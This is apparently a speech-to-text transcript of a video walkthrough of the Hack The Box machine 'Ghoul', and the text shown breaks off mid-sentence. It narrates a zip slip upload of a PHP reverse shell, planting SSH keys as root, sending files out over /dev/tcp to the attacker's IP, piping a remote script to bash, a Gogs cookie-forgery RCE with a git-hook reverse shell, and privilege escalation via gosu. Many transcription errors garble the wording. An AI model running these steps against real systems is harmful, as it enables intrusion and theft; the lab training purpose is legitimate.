 what's going on YouTube this is ifs I can be doing ghoul from activox and first thing first I'm gonna make mistake away door on this box and say it's Nora to themed it's actually a different mom called Tokyo ghoul but I didn't find out about that until after I finished all the recordings so forgive me there the bugs itself is really fun it can be a bit frustrating with all the document a knows that you have to do lateral movement through especially when you have to start swimming back through previously compromised dog containers it definitely sucks getting route and finding out that the flag you seek is in a different castle but it is pretty real in that sense it starts off at the very first dog container using zip slip to get tomcat to extract a PHP web shell onto the Apache HTTP server you get shell there you can pop that hold our container get root you find SH keys and get into the second docker container which is a desktop machine essentially and you don't have admin there but that machine is dual homed to talk to a separate network that has gog zoning which is essentially like a git repository you exploit that get root there and then view the git commit history of a project to extract credentials that you go back to the desktop use those creds to get admin there and then you notice that a user is SS Aging in every like five or six minutes and they use a SSH agent when they SSH in so you can intercept that agent and then use it to swim back upstream so it's kind of sound a little bit complicated but I'm sure once we do it it'll make sense so let's jump in as always we start with an end map so - SC for default scripts SV enumerate versions Oh a up all formats plan the end map directory and call it cool and then the IP address which is 10 10 10 101 can take some time to run so I've already ran it looking at the results we can see two interesting things the first thing being there's two different ssh a--'s and two different HTTP the HTTP aren't too interesting because one is httpd the other is Tomcat you see that quite often however there being two different SSH listeners is definitely interesting in a corporate environment this could just mean you hit a NAT at IP that points to different boxes on a hack the box machine it almost always means is going to be some type of virtualization technology so look at the host keys we can see the keys are indeed different so these are different SSH processes additionally the banner for one says it's open sh 7.6 P 1 Ubuntu 0.1 the other says that Ubuntu 0.2 generally when dealing with virtualization technologies I always assume the host is going to be more up-to-date and the guest is not going to be and that's just because containers like docker have become so popular and people just tend not to update the docker images at docker OS so I'm just going to Google the ssh banner and we're gonna go to launchpad and see exactly what release this is it is ubuntu bionic i'm gonna change this to at 0.2 and we see this is ubuntu bionic as well so both them are at least running the same version of ubuntu before we go too much further I'm just going to start taking notes and Cherrytree I do control end to create cool control-shift-n we're gonna label this interesting and we'll say SSH listens on 2 ports 2 2 is for Ubuntu 0.1 and 2 2 2 2 is for Ubuntu 0.2 so when we get a shell if we get confused we can always go back to the interesting tab glance over it and be like oh which one are we noe in port 22 or port 2 2 2 2 so just some things to help out then we also have the two HTTP the first one being on Apache HTTP D the only thing we see is the HTTP title is the AO gory tree so that's generally not too interesting on tomcat we see there is authentication required without authentication we get it unauthorized in the realm is also allegory so nothing too interesting I'm gonna start off with just the website because that did not give me an error message the tomcat gave me the for one unauthorized and going to the page we get just looks like a blog we have designed by template monster that is not really a CMS or anything so not worth looking into exploits there I do control you to view the source to see if I see things that are common in like Joomla or WordPress don't really see that off the bat we can check out blog ambition strength going through this everything so far has been just HTML I'm gonna go right off the bat and start a go Buster so I'm gonna make the go Buster and we're gonna do go Buster dir for directory brute force - you for your l HB 10 10 10 101 then - W forward list user share word list der Buster then directory list 2.3 medium - Oh out file and we'll just do httpd brute dir list sure so with that run and right off the bat we get a few things images not interesting archives and uploads definitely could be users also could be so I'm going to go with archives first we just get a forbidden can access it upwards was the second one can access that slash users and we get a PHP login prompt so this is definitely going to be interesting and the fact that it's PHP is interesting as well we can pretty much do our same thing except to add the extension PHP so I'm going to copy this actually we can just stop this one and do dash X PHP we may want to do a better word list with less things so it doesn't take as long because we're adding dot PHP to a bunch of things that we assumed or directories but yeah we have time so we'll let that run we do have a login prompt so the first thing I'm going to do is switch to burp suite steal this request and send it to SQL map and then we'll go look probably at Tomcat so let's go to burp proxy intercept is on log with admin pac-man plate that bad I'm in password go over to burp we can copy request to file and we want to put this in root htb boxes this is cool and we can say httpd login dot request and then we can do SQL map - uh HTTP login dot request and we probably want to do - - patch and that will keep that going so let's go while a recon is going and check out port 8080 so we can turn burp intercept off go to port 8080 and this is Tomcat so I'm going to try like Tomcat Tomcat admin admin just trying all the defaults for Tomcat and eventually we get in right now I do see a logo Sierra going into the source I'm trying to see if I can figure out what technology this is we know it's something Java related because of the Tomcat but we don't know if it's like any CMS or something so I'm going to save this image as logo.png sure that is fine and I'll go to google.com slash images I'm going to do a reverse image search on this to see if we can find it on the web so if we go to route downloads logo and Google is searching wiki that's not going to be helpful collins dictionary we do not so i have no idea what sierra is or what this framework is that's running this website just going around see if we have anything it's lorem ipsum everywhere so indicator that we shouldn't go to these pages since this text is meaningless we go back to the home we can see there is a place to upload images if we go through this carousel the middle one is nothing and the third one is upload zip so we can upload images or zips so what I'm going to do is go back to burp intercept on let's just go and try to upload something logo dot PNG upload and we can send this to repeater and I also want to quickly go and choose a zip I'm also do logo dot PNG send this one to repeater wait did I do that correctly now that's post image we can drop that there we go post slash upload I'm looking right there okay we can get rid of requests too we can rename this to upload image and we can rename this to upload zip so if we upload an image [Music] they only accept JPEG so let's try changing this to JPEG and this will just click go to see if it does it by content type does not let's try putting in the file name and it looks like since both content type and follow name date match they must be matching on magic bytes so we'd have to find a jpg image and look at it the other thing we have is the zip so let's check this one out they only want dip files and this is something that is tough to find on your own it's a vulnerability called zip slip and we also have secret dot PHP there but honestly it's tough it was easier when this box first came out because the vulnerability had just came out but these type of vulnerabilities get to be tough to find like image tragic things like that just because it's one of those it's very hard to enumerate it's one of the things you just have to try so zip slip is common to find mainly because it depends it's a vulnerability in a library and a lot of times with some applications like you have Python virtual and you may not be uploading your library when you do apt update because it's in a little virtual container and tied to the application so that happens with a lot of like Java websites Python things whatnot that you'll find them using outdated libraries and necess doesn't detect it because it just sees your OS but libraries and sees your OS libraries are patched but your web server may be running a slightly out of date one and zip slip affects a lot of libraries you can go to this page and read more but we're just going to use the evil oak library to test this out so let's copy this and to /opt get clone and SQL map saw nothing but if we go into evil work we have Python 3 then we can see oh it's Python actually before we do this let's explain what we're doing so let's go back into HTTP boxes cool and if you create a zip file let's make a verb dub dub HTML and we need dash p to do parent directory so if we touch please sub and we create a turret I've of CBF desk doctor and saver and I think gets T for listing contents boom we can list the contents of the start archive and see it's going to create the directory verb or a WWF HTML and VAR w doubly HTML please subscribe what zip slip is is if we took this and put a dot dot slash before this then we'll now extract to one directory up and then that so it's very hard for us to create the directory dot dot so if we do like make dash dash dot we see can't create the directory it exists so it's very hard to do this with just man line with this evil work application does is it does creates a zip through I don't know what good would to explain it but it mainly creates the zip and lets you put anything you want as the file name so we can easily put that dot dot slash to exploit it so if we do Python evil arc - H we need to do dash D is for have any duh what depth you want to do we can default to eight that'll probably be fine - oh this is a linux box we do UNIX and then - P for path we want dot dot slash we don't do dot slash we just want VAR dub dub dub HTML and then the file we want so we have to get a file so let's go back into HDB boxes cool we can delete testdir and over I'm going to locate PHP - web shell locate I think it's CP user share Lau laundry ohm yup and then PHP PHP reverse shell this is the one I want so I'm gonna edit this and then its default IP I don't know what it is set to ten to two one let's just change this to our IP address so we are ten ten fourteen three I believe so if we do if config tun 0 we are indeed 1010 fourteen three and we'll listen on port 9000 1 okay so now we can move this to just be Rev dot PHP so it's easier referenced and then I'm also going to create test dot PHP and this is just going to do an echo statement and the reason why I'm doing this is if a Reb shell doesn't work we can go to this and see if we can execute PHP code so this way just means we don't have to upload files twice we have a test file and a full reverse Richelle so check out HTTP epic rocks so put that as the file and part of the reason I did that is because I wanted to advertise the new website aprox but now we can go and create this archive so let's do evil arc for dub dub dub HTML and we're going to put brute htb box's goal test dot PHP the init and we're also going to add Rev dot PHP so this is a zip file so if we do unzip el evil dot zip we can see it created the zip file and we have the directory traversal and then our files so let's go back to this upload thing cool we can probably turn broke off it is off zip file and then opt evil arc and then evil dot zip upload it it's thinking come on upload maybe it's still waiting on an HTTP request let's redo that so upload image no we definitely want upload a zip evil arc upload there we go thank you for contributing and it says is uploaded and the whole reason we did that zip slip vulnerability is if you went and try to find the upload you wouldn't be able to so if you did like upload slash Rev dot PHP doesn't exist but if we do Rev dot PHP here oh it doesn't exist that's weird so maybe the depth is wrong so let's try this again let's do a depth of one and try this and this is why I said finding these vulnerabilities can be tough and it's something you just have to do if you do like an advanced vulnerability assessment which is just really a vulnerability assessment done correctly and look at all the libraries a server uses for this web server you'd find this relatively easily so evil dot zip let's upload this and there we go so it looks like we just needed a depth of one maybe having all these extras screwed us up so if we do NCL VMP 9001 refresh Rev PHP we get a shell we can also abduch was it test dot PHP and we see check out if SEC rocks so let's keep on going actually let's check out that secret dot PHP thing as well so we get the reverse she'll see this in go Buster and check it out so if we do secret PHP we get a chat Tatara noru kaneki @o kaneki so we get a bunch of secret chats let's go over to cherry tree and put user names the taro Naru kaneki datura visit tutorial Shara kaneki no rule there's one more thing that tell okay and if we look newer here is asking kaneki for access doormat webserver and it looks like this could be a password and then he's also saying he made a fake website to upload pictures secretly so this is probably that Tomcat thing so he probably went a little out of order but I'm guessing this was the Tomcat thing user dot text with flag hopefully that's not the actual flag I don't know but they're also talking about some type of RCE and let's see don't have some type of RCE so let's just keep on going we do Python see import PT y PT y dot spawn bin - and then we control Z s TTY raw - echo F G Anna and now we have tab bar and bleed everything I'm just gonna go and kill this go Buster because I know there's nothing else interesting there I'm also going to export term is equal to X term so I can clear the screen but the first thing I wanted to do was check where I am do LS - la and slash we see we are indeed in a docker I can also go to Etsy SSH and then we can look at these host keys so I'm gonna do SSH - key scan what is it I think it's - do I have key scan about that key Jen I want - L and then we want - capital e md 5 - f which one we want let's do the host RSA public key SSH - key Jen my bed ok and we can see the host key so let's go back to our box less and Matt Gould and map search for that string and we see that is the one on port 22 which is the older version so let's go back to interesting and this is the doctored contain this we still don't know what that is but at least we got one of them so let's go see what else we can enumerate we do a net stat a o NP grep listen we can see this box is listening on 80 and 80 80 localhost 8005 not exactly sure what that one is that could be like a docker thing but it's also listening on Tomcat we can't see what Tomcat is running as in the net stat output but I think if we do like psdf and then grep Tomcat we can see Tomcat is running as root so since it's running as root we can double check what our files are created as so we could just go to dub dub dub HTML OS la we can see test dot PHP is created as the root user so what you could do is use this file upload vulnerability to drop an SSH key as root so we can try that real quick go - SSH - keygen - F we'll call this goal okay and then cat go to pub okay and this may actually wipe something oh you could do the zip slip vulnerability and upload this and be good actually we should be fine let's just do it we'll see deal with the consequences later so let's go back into up or is it evil arc and do we have this we do so the path we want now is going to be /root slash dot SSH and we should name this authorized keys so let's move cool Pub move root h-2b boxes gule gule pub to just be authorized keys and we can do paesan evil look Oh UNIX depth 2p root SSH and dukey's so now evil dip let's kill evil dot zip real quick let me create it and then unzip - L evil dot zip has this oh I did depth of two won't see if this works I think I did depth of one before but if we go back to 8080 brows evil dot zip upload and now SSH 10 10 10 101 we probably should go back in a goal directory chmod 600 a sage - I - specify that key 10 10 10 101 we can log in as root so this is a shortcut around some steps so we're gonna back out and ignore that we did that and just work from this prompt so let's exit this and begin our enumeration of the box we know Tomcat is on 8080 that's not really too important the other thing we probably should look at is like find any config files to see if there's passwords there so if we look at uploads nothing there look at archives nothing there we got some JPEGs that's not too interesting if we go to users there is a login dot PHP so let's look at what login dot PHP is starting array kaneki password Naru password admin and password so we got a few creds so let's go back over to cherry tree and go into new thing creds and copy this so paste and we can get rid of that just cleaning this up whoops like that that I just hate this format so just cleaning it up there with me for a minute okay so we got some creds and this law again we can look we can try logging in to see what happens we just looks like we get a JPEG we look at index dot PHP doesn't look like we'll get anything but let's login for completeness sakes so users and then one of the creds we just did admin ABCDEF so admen ABCDEF it's all you get so nothing too interesting there let's go into Tomcat I think Tomcat is generally somewhere in user maybe use a share Tomcat that's not it maybe we can just do locate Tomcat oh we don't have that let's see find slash grep Tomcat to dev null user something definitely user user share Tomcat 7 users share Tomcat 7 and then if we go into Web Apps or not Web Apps configuration let's see there's Tomcat - users and we can see I'm an admin that's we logged in as there's one commented out that is admin and then the past is test at a Oh Gauri one two three so we can also put this and interesting because we don't know what it goes to but hold password for tomcat so what's that thing said we can also look at what other things are here we go - lets go in Lindon um that sounds like a good thing to do so CD /opt linen oom python - em simple HTTP server and then we can curl ten ten fourteen three four eight thousand when a new message pipe to bash not found let's just NCLB NP nine thousand one when a new and then we can do - dev TCP ten ten fourteen three nine thousand one can I do it this way yep so thorough tests have been disabled as we saw in the beginning but this won't still run through and we'll see if we get anything now there it's done let's just go back to the top search Lynn a Noom and then go through this output so we can search for this and then just hit n colonel information not really important potentially a colonel probe ask but I like rolling those out as we look through first just because some of these boxes are old and it's really lame to prevent something I came out after the box was created so current user usernames that previously logged in so there is an interesting thing we have root and then kaneki logging in from 172 2001 which I believe may be box so maybe that's not that interesting it would be interesting to run this before we did that SSH thing in logged in as root to see if root had a different login who else has logged in at No 1 and group memberships no one Etsy passwd is going to show all the users we can see that connect e8o and Oro have accounts amit root login is yes environment information not too interesting path shells new mask password storage not too interesting cron jobs just going through seeing if I see anything that sticks out that's not non-default nothing is IP address 172 20 0 10 so kaneki I think logged in on 2001 which would be probably the docker host so that is the her sky not too interesting up history once in we do 2001 again nothing we couldn't just guess right off the bat listening ports this is net stack connections we already looked at that running processes not too interesting binaries Etsy Annette sudo Apache there's looking at su ID files nothing looks non-default and pretty much about it so I'm going to try running this real quick with thorough scans on to see if we get anything better so let's go Landen oom and what is it thorough then thorough test enabled I guess we can just do a thorough equals one to the top so let's see where do we run debug info wait let's just do it here thorough is equal to one we'll see if this then says thorough test enabled bash thorough tests have now been enabled so I'm going to let this run it's going to take a little bit longer and then we'll see if we get anything else that is interesting scan is complete so let's do the same thing and then search for that and Colonel we've seen hostname group seen memberships route routes camel again available shells let's just make this bit bigger so we can see it better cron jobs Network name doesn't look like anything too interesting right now let's see config system config sudo stalled compilers reading sensitive files net whole set UID can't search a lot of things it looks like if we set some type of parameter we can search through config files PHP will all get any for text we do have the ability to listen on a socket probably if we use Python not listen capture network traffic and that's it for that so nothing too interesting and when a new let's just mainly look at things if we go into backups we do have a backups directory and in that we have files like no tax sales xlsx one if that's in like dot bash history now you'd probably have to find do this via fine command and search for dates around the time the web server was running if we go over dub dub dub HTML you can see the webserver is created on December 13th and then the data and ver backups is also December 13th so this is doing a little bit of forensics which is always handy doing tests to go and find things you want so what you could do is be like okay well we know the webserver was created and deployed on December 13th what else was deployed on December 13th did they create a backup of the old web server before deploying the new one I don't know so maybe they would run a command like find slash to find all the files in the root directory and then - newer MT and this is going to show files modified after we want December 12 2000 18 well yeah December 12 2000 18 because the file was created December 13 and then we do exclamation point because we don't want this next flag to match so newer MT 2018 12 14 so we're looking at files modified after December 12th but before December 14th we're gonna do type F to specify only files and - LS to show us a bunch of other good information and then oh it's gonna put me over here all I'm gonna do here is to dev null and there's going to say hey error messages go into dev null so running this it probably wants no spaces there to have all like that there we go and we can see all the things ran and this is not gonna work because this is docker and looks like docker created everything when it's brought up so we don't really get good file creation times at least around December 13th so that sucks I'm actually not sure how to find ver backups other than just a lot of InfoSec on the box when I did this I had used the Tomcat file upload data sage and as route that we showed earlier so let's look at the files we can look at no txt and these files are from a remote server ezreal will be saved here this makes no sense to me so we can ignore that that's another box that I think the same box creator you created sales directs LSX an important PDF we can copy them but I don't think I have Google or not Google office OpenOffice installed so it's not gonna really help I don't feel like installing it right now so a maker docker uploads and that we can do NCL vnp 9001 and all you do is like cat important PDF to dev tcp 1010 14 3 9001 god that screwed at my terminal 10 10 14 3 9001 there we go and I probably should direct this to a file so directed to important PDF run this again and it's getting the file it should close out when it's done let's see we can take a chef yep it just took water run so we can do Nautilus period and try up opening this important PDF doesn't open if we wait file root each to be ok I saw a darker and there's equate this upload from that but I forgot I put darker in this path if we md5sum the file and go up to here md5 saw important and it's the same md5 sum so this PDF is just corrupt you could run like exist tool on it and see if it has any metadata maybe who created it that could be a hint but I'm gonna ignore that if we go into keys we have a few keys ed towe kaneki and Noro so if we can't add oh we get a private key so let's just send all these go back to this will do ETO key and then we will cap this direct it to dev tcp 10 10 14 3 9001 sent so now let's do kaneki key and I can cat that I'm gonna hit alt period which cycles through the previous arguments I've used and dab TCP is the last one so I want to keep typing that again I also don't have to put it on my clipboard IDO kaneki and no rule so let's do I know our oh I think it's best last one cat yep I did not hit enter okay we got all the keys so now we can begin using them so if we do SSH all we can do chmod 680 oh we can just do start key oh just start and remove important that PDF so Shi eto 10 10 10 101 see if we will again permission denied we could do - P 2 2 2 2 well again permission denied we can try kaneki key and we need a passphrase so I could show you how to crack this with John but I've already done that before and I'm lazy I don't want to show it again instead I'm gonna use this to say hey you should check out if SEC rocks where you can search for topics on videos and get links to everything so if you do crack SSH you can see we've done it in this machine which i think is pinky's I got the machine name wrong there it's pinky something bright pinky's Castle version something but links you to the description and if you go to youtube and look at the link in the bottom right or bottom left it links you to the exact spot in the video so if you want to figure out how to crack as sage keys go there otherwise we're gonna go back to our user names and kaneki on secret PHP set a password and we're gonna try this password and we don't get in but it didn't say a decryption error so if we enter the wrong password we get that so let's try not on point 2 - 2 - just here and OH with all these I probably should been specifying the username and instead of root eto at connection closed foot 2 2 2 2 connection closed so let's try kaneki so that's what I was doing wrong and in the passphrase and we can you log in to this box as Carnegie and we get a few things we have to note files a secret JPEG and user dot text so if we can't notes we see he set up a file server into the service network we need a transfer files you can use my PC direct message me for access so if we do note dot txt vulnerability and gods was detected I shut down the registration function please ensure that no one gets access to test accounts so this note is telling us hey they found a vulnerability and one of the websites called dogs and in order to fix it they shut down the registration function and there's probably still a vulnerability in it because they don't want anyone to get access to the test accounts so the vulnerability probably just requires authentication so we can copy this and put it in interesting and then we're gonna hunt for gags so interesting notes txt probably a authenticated RCE so good way to find this will be just to write a bash script because I don't think and map is on the box they're not that kind neck gets on the box are there n C and C 80 nope so let's just do a bash good so we can do scans Sh then bash for I and sequence to 255 this is just going to print out everything so if we do echo I here and done we can bash scan and we get it printed out so what we're going to do is ping - c1 - wait one this is going to be a delay the IP address I think it's one seven to twenty one seventy two twenty zero ten so let's do one seventy two twenty zero I and the reason why I skipped one is because we know one exists that is the host or gateway and probably what's on two - two - actually we should be able to test that real quick SSH - key scan do we have that we do so we can do 172 2001 and then if we do an SSH key scan on - P - 2 - 2 10 10 10 101 let's see this was the smallest so II D 2 5 5 1 9 maybe this is not Ubuntu 0 2 0 1 so these are still different hosts because we're definitely not 0 1 we are 0 10 so probably a second docker container since 2 2 2 2 is not matching 0.1 and 0.1 is definitely going to be the Gateway which is the host so let's just finish this we'll go into ping this and we can send everything to dev null so that's going to send standard out and standard error to dev null and then if the exit code is equal to 0 then we will echo 172 20 0 online and the if statement and that is a script so if this ping fails the exit code is going to be one which means the box is offline if the as occurred zero that means the box is online so bash scan SH and we'll probably get the weight around 254 seconds we see that once I'm to 2001 50 is also online so let's go and try logging in let's go doc uploads and then Sh - I connect a key kaneki at 10 10 10 101 and copy the password paste it well again and then if we try ssh 172 2001 50 did we just connect to our self exit it just died on us so definitely did not work SSH - key scan was it 172 2001 50 we can look at let's see this is for Ubuntu at 0.1 and I'm going to let's do this in a different terminal window let's open a whole new pane so we can split it this way so the first thing I'm going to do SSH - key scan 10 10 10 101 and let's login so go to doc uploads SJ CSI Kanaka key kaneki at 10 10 10 101 copy this password again paste SSH - key scan 172 2001 50 we can see these are definitely different this one ends in SK GA this one ends in f h CW and if we tried - P for two - two - maybe it wants it beforehand we see this is definitely different because it's a different Ubuntu OS so this is a new box and when we try to log into it SH - V 172 2001 50 we get authentication nothing else so one other good file that is slowly being phased out is authorized keys and what I mean by slowly being phased out is I don't think it shows user names anymore let's look at okay Dhar ssh authorized keys don't have it here don't have it but we see a username of kaneki pub so it's essentially doing a hash of this now so it's you don't get this information I believe but this is always good to see because we see an additional user name we have kaneki and then we also have kaneki underscore pub so if we try using that username Shi kaneki pub at 172 2001 50 - I we won't do - sorry the passphrase it's gonna be this I love to come and we can log into this box so we just had the wrong username so now we're on 172 2001 50 so if we do LS there is a to do and it says give a rogue or a test user access to echo for get we do up - a n we can see there is a know the network 172 1801 and if we let's see if config we got 172 18 0 200 so we may just want to scan this 172 18 now again we could do net scan net stat al NP grabbed listen and we see we're not really listening on any ports so probably should run this network scanner on this box so if we cat scan SH we can grab this and what we could also could do is SSH key scan 172 1801 and 172 2001 and we can see both dot ones or indeed the same box so let's be scanned SH we should set mode to paste set mode paste set paste May here we go we've need to edit the 20s so let's change this to 18 and then we can change this to 18 as well we can do bash scan SH and we see one semi - 1802 is online so I can I kill that ok let's copy scan - port scan SH and we can try let´s do echo 1 - dev TCP 0 to /i let's see if this works I actually don't know if it'll work we can do two I online and we can say for I in 22 that should be fine bash ports can let's just get rid of this loop and two three four five six seven eight I think if I just do DW yep and then come at that and will change I to one so we'll see if this works chmod plus x ports can ports can dot Sh 22 on line 23 connection refused awesome not sure why we're getting this echo 1 I'm not sure why we're getting those error messages probably to Devon all whoops - Devon or there we go so now if we do 22 we can see it's open and you can try a lot of ports if you googled galaxy's default port is 3000 so that's the one you want you can also try all the SSH keys to get into 22 that wouldn't work as well for times sake and not just typing a bunch of things we're just gonna go straight to port 3000 the issue is we want to get to this from our local box but this docker container has is not milk accessible so what we have to do is we have to create tunnels so we will go from we can just do it here Carolee - we'll call this HTTP - I don't know what box this is we call this the fashion Hirst - cogs so we have to create tunnels to do this and if you're not familiar with toners tunnels highly recommend watching the Redis video or EDD I Sh but if you are familiar this should be easy so I'm just gonna exit all these terminals and we can go back to a main SSH session so we can exit that we can clean this up eventually I'll want that yeah not yet so on this host so what I'm going to do is I'm gonna hit enter and then shoot I'm gonna hit enter and then swig lessee and that's gonna open the SSH command prompt so enter squiggly see if you don't know about that you can just Google like SSH Konami code and then go to a sans page really good blog post but we're going to do a local port forward which means we're going to listen on a box let's listen on we'll do five thousand and one and then we're going to direct this to 172 2001 50 on point 22 okay so now on our box whoops let's do this split actually answer it this way so now on our box if we SSH - p25 thousand one on localhost lowercase B we are now going to one send view 2001 50 so let's do - I this is going to be the darker uploads kaneki dokie kaneki at local host and the passphrase let's grab it out of here paste it connection closed Oh kaneki underscore pub is this guy's username paste it and we're logged in so now we can do the same thing squigglies see - L we can say listen on port 3000 and we will direct it to 172 1802 on port 3000 so now we have a tunnel that is listing on our port 3000 and we'll go to 172 1802 3000 so if we just go to Firefox one 27001 3000 we can see cogs so we know the registration function was disabled from I believe the secret dot PHP we read it somewhere that said it was disabled we can see that gags is from 2018 based upon the copyright you also get the version number so the first thing to do is look for that RCE they talked about search search boy cogs if we do dash X and look at this scrolling we see the timeline this is 2014 probably not can be 2014 since we saw the copyright was 2018 and it is now year 2019 so we know the copyright isn't dynamically created based upon the date so whoops let's look see if this one is also 2014 disclaimer it's fairly level let's see this is also 2014 so search poit isn't gonna need too much help for us right here so the next place to look is probably the CVE database so CVE search is going to be like search CVE might work whatever this is search for dogs and we can see all the various see V's I'm gonna pick this one first just because it allows remote code execution as demonstrated by dot dot session file but if you search this you can find a blog post there is a get that is in Chinese if you translate the page you can get a better description here's the blogpost it was translated from also in Chinese I'd recommend reading through this after you use Google Translate if you open this page up in chrome you'll have a translate button and it'll be pretty easy to read but this is essentially what we are going to be doing so let's go back into the github and we'll copy the exploit code so this is what we want viii will call this cookie gen dot go set paste paste it in and for this exploit to work we're going to need a what is it valid login so just put this on the back burner and we can try to sign into gods if we remember there was a note somewhere I think it was on this guy cat to do give air glory test user access to so this is giving this account to add toe forget so this is give me the account name and then way way way back there was a Tomcat config that we put under interesting old password for Tomcat test at a Oguri one two three and based upon the note erigor a test chances are this could be a valid password a try we try sign-in we are good so if we go through this unfortunately it's a pain to go through the translate page so essentially I'm gonna step through that page it won't be stepping through it so we're going to create a new repository and we're going to give a repository a name so it can be private doesn't have to be let's do please subscribe and then the description is going to be brave ask get ignore I don't think we have to put something I just am read me don't have to but this initialize we need to make sure that is checked unless it'll just make things a little bit more difficult invalid CSRF token that's annoying go back here and let's login again I think there's something weird with this box maybe one of these self-healing things that forces you to log out so constantly and it gets really annoying but oh well please subscribe test click something click something initialize repo okay and we want to upload a file so what we're going to do is use this Gil code to create a cookie so go run cookie Jen cannot use or create type in maybe this is because of a wrong go version let's go to line 28 28 let's see doesn't look like it likes these variables will do 644 so that's just a chmod number whoops and I'm not sure if it once quotes 6 5 for sure go run cookie Jen we don't use OS anymore okay so that works so this created a go serialized object maybe Guercio lized object created a go object we look at data you can see what it is and we want to upload this file so I'm going to refresh this page because it's probably welcome email it actually done it awesome so upload a file let's do Nautilus period and we want to drag our file which is data to be uploaded can be anything commit changes okay so we go to a file there now the vulnerability allows us to do a directory traversal to this file so we go into or Firefox I just hit f12 go to the storage tab go to a cookies I like Doggett's and this is going to be the default path for things and before we do that we need to look at our ID if we look at where slash Fork is a repo ID is two and that is going to be what we use so we want to go up one directory and then go into I think ten and then data - repo / - slash data so what we just did was go up one directory puts us in tamp go into I think it's local - for you pal / - I think this is it maybe it's data slat we'll see but do a directory traversal if this file exists then this I like Doggett's will execute the file and we'll be good so save that refresh and the page worked and if we look now we are kaneki so let's save this and show what happens if we didn't do this because I forgot to show you that so save that let's delete all cookies and log in again so a great test save this well again so if we go to this repo do settings we only have the options collaboration branches web hooks deploy keys if we're in an admin on this box which we do by this exploit then we'll get a additional one called get hooks and this will execute commands whenever something is done so if we do update then SH we can run commands here so let's do this bin SH and we will say bash - I zero let's do bachelor we'll do reverse shell cheat sheet and I think it's pasteurized zero at and one let's see ash - I there we go this is what we want so this tacking IP this will be ten ten fourteen three point nine thousand one let's make sure we are listening so NCL vnp 9001 update the hook invalid CSRF token let's try this again it's probably cuz I like navigated it pay different tabs paste ten ten fourteen three nine thousand one update hook there we go so now whenever a get update is ran it will execute this script which will then send us a shell hopefully so let's go back to please subscribe will do new file and commit to change nothing let's try can we update it go back here edit this file please check out EPS acts and support me on patreon so now we are updating this file and we'll see if this metric is it nothing so let's see we probably screwed up they get hook somewhere so let's go back into settings web hooks about web hooks get hooks update then Sh let's try bash C and then this so this is probably not in bash shell this is probably in just shell and didn't have access to that functionality so I'm just doing bash - C we could also probably just rename that to been bash up there so which I both update the hook okay let's go back to please subscribe we can edit this and support me on patreon of course subscribe on YouTube commit it's not responding right away that's a good sign because we have a shell so that won't finish until a shell dies so let's do Python C import PT y PT why not spawn then - Python command not found Python 3 import PT y PT y dot spawn then - python 3 not found we could use script as well so let's make sure it exists on the box with witch and script his not there as well so we just can't get a proper TTY in this box easily let's run Lynden oom so let's do I guess up here do we have curl we do have curl so we can do make the dub dub dub CDW dub CP opt I'm going to new will new message here and we can do curl 10 10 14 3 port 8000 Lynn a new message Python - M simple HTTP server and we probably should execute it so curl 10 10 14 3 8000 Lynn a new message pipe to bash there we go so now our checks are running and then once this finishes we can go see what there is there were just a ton of files that went through and right off the bat I see something interesting here on su ID files user s been gosu so let's go take a look at what this is we can search for GTFO bins and see if it knows what goes who is it does not go sue Linux simple go based set UID program so gosu user command it looks like so let's try go su root bash ID and now we are root CD home and we have a 7-zip file now so not yet at root week at session sh o we get a username password kaneki and 1 2 3 4 5 I love toku so let's copy this put this in creds kaneki this ok and let's send this zip file to us so cat a ogirri app dot 7-zip - dev t CP ten ten fourteen three point nine thousand one okay we can NCL VMP 9001 is going to be a GRE app dot 7z we need to direct it run this cent and let's make the app just in case this 7-zip doesn't go into its own directory and we don't like just put a bunch of files in a working directory that is like one of my biggest pet peeves when I unzip something and it just clobbers whatever directory I'm in so 7z X a Giri OS this is the chat app and looks like see an ASCII script we can look at it that's been SH see source we got a java application it looks like Jesus so many directories and you can look at the source of this app using spring not too interesting I don't even know where this chat app exists so the first thing I'm going to do is try to get some information on it we got to read me replace the old PHP application because it sucked uses spring hibernate as well as others still doesn't tell me exactly where it is so if I do like git log we can see some funny messages updated readme update dependencies MySQL support so this is one they first added my sequel so we can do get diff and look at this we see user name Carnegie and a password so we can also try SS aging into this so let's go back out here and let's see SSH kaneki at 10 10 10 101 - pee - - - - and there's going to be public key only so let's see we have to figure out where the root is oops this one if we ssh to 172 2001 let's see root at that looks like that requires public key so i wonder if we have a key somewhere OS OS that way CD dot s doesn't exist let's see the only box we haven't got root on is 172 2001 50 and we had an SSH tunnel listening on localhost 5001 to direct us there so let's do SH - I doctor uploads Kenickie key kaneki underscore pub at 10 10 10 100 nope 127 0 0 1 and this is port 5000 1 yes and the passphrase this is going to be this and this probably just ok I didn't regret I'm surprised that um I prompt me for the banner maybe I type localhost last time but no were here so what we can try is su - to switch to the super root user and let's look at this get diff again and try this password so copy/paste and it doesn't work so let's do get long again and see what's here so conky did that let's see stop doing stupid crap let's definitely take a look at this one get log get deaf what is this doing I'm not exactly sure what that one's doing there is also a get ref log and this will show you things that may have been hidden or reverted so if we look at get log let's see around my sequel support we have added Remy my sequel hello world we look at get ref log hello world this let's see what am I supposed to be looking at I thought this would be it let's just do it the lazy way so open the new pane let's go back into the directory split it vertically and then we'll do get log grip on commit because I forget all the flags to do what I want it to do and then we can do get ref log Oh app hey yogurt chat app get ref log and then let's look at this so starting out we have 8 B 7 4 so that's good then we have B EC matches 5 1 D matches II D 5 matches 8 1 three matches B 3 7 matches this doesn't so once we get to this added service we don't really see anything so this is definitely a reverted commit so we can do get log and see what this is or get diff see what this is and we get a different password here so we can try this one so go back here su - try the password that failure see let's make sure I copy that correctly thought that was it okay we can keep going through this so get hreflang we added it at added service which was e to D we get this Zod that's also not there so we can do get log or get diff this and see what's changing user name is kaneki so maybe the user name is kaneki instead of kaneki pub so let's try su kaneki su - you let's see let's go be a way to switch - L know passwd entry for comma key okay at C passwd kaneki admin we can try this authentication failure we enjoy kaneki admin with the other credential user names do we I know we copied it maybe we did let's go back we got a password here this one says root so try su with kaneki admin should I just ask you one of these times we will get it so let's try a different morgue and let's do the responsible thing and take notes of every password we've done we'll come across so let's do pw's paste that one we did this G as well let's go back to this one and see what these passwords were get diff and this is seven something copy this see you - oh there it is finally so now we have root dart X if we double you see this a hundred and ten I'm going to assume that is going to just be the hash I'm gonna cat the file and if the video ends I'll see you all next week and the video goes on there was a challenge in route dot X that I forgot about so and the vide is not done we still have another thing to do you've done well to come up here but what you seek isn't here the journey isn't over oh SLA huh man I thought I was done let's go into kaneki underscore admin and see if there's anything here there is a dot ssh directory and let's see can't authorize keys kaneki at 